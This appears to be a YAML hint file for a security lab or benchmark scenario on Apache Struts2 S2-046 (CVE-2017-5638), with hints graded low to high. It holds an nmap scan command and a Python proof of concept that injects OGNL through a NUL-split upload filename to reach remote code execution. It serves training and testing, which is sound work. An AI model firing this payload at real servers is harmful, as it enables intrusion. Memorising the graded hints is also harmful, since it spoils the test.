schema_version: 1
match: struts2/s2-046
cve: CVE-2017-5638
hint_levels:
  low:
  - Inspect the struts2 service or application on {{NODE_NAME}} @ {{NODE_IP}}.
  medium:
  - |-
    Catalog TCP ports: 8080. Identify the exposed services:

    ```bash
    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
    ```
  - 'Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp. These are recipe defaults;
    use the deployed service port if the scenario remaps it.'
  - 'Documented target URL(s): `http://{{NODE_IP}}:8080`.'
  high:
  - |-
    Vulnerability: S2-046 Remote Code Execution Vulnerablity（CVE-2017-5638）.

    CVE record(s): https://www.cve.org/CVERecord?id=CVE-2017-5638
  - |-
    Exploitation

    As same as S2-045, S2-046 is also the OGNL injection but occurs at filename field of the upload request, and a NUL byte is needed to split payload and the remaining strings.

    A simple Python POC for Verifying the vulnerability:

    ```python
    import socket

    q = b'''------WebKitFormBoundaryXd004BVJN9pBYBL2
    Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',233*233)}\x00b"
    Content-Type: text/plain

    foo
    ------WebKitFormBoundaryXd004BVJN9pBYBL2--'''.replace(b'\n', b'\r\n')
    p = b'''POST / HTTP/1.1
    Host: {{NODE_IP}}:8080
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.8,es;q=0.6
    Connection: close
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2
    Content-Length: %d

    '''.replace(b'\n', b'\r\n') % (len(q), )

    with socket.create_connection(('{{NODE_IP}}', '8080'), timeout=5) as conn:
        conn.send(p + q)
        print(conn.recv(10240).decode())

    ```

    `233*233` has been successfully executed:

    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-046/1.png
  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-046/README.md'
  - |-
    Additional public references:
    - https://cwiki.apache.org/confluence/display/WW/S2-046
    - https://xz.aliyun.com/t/221
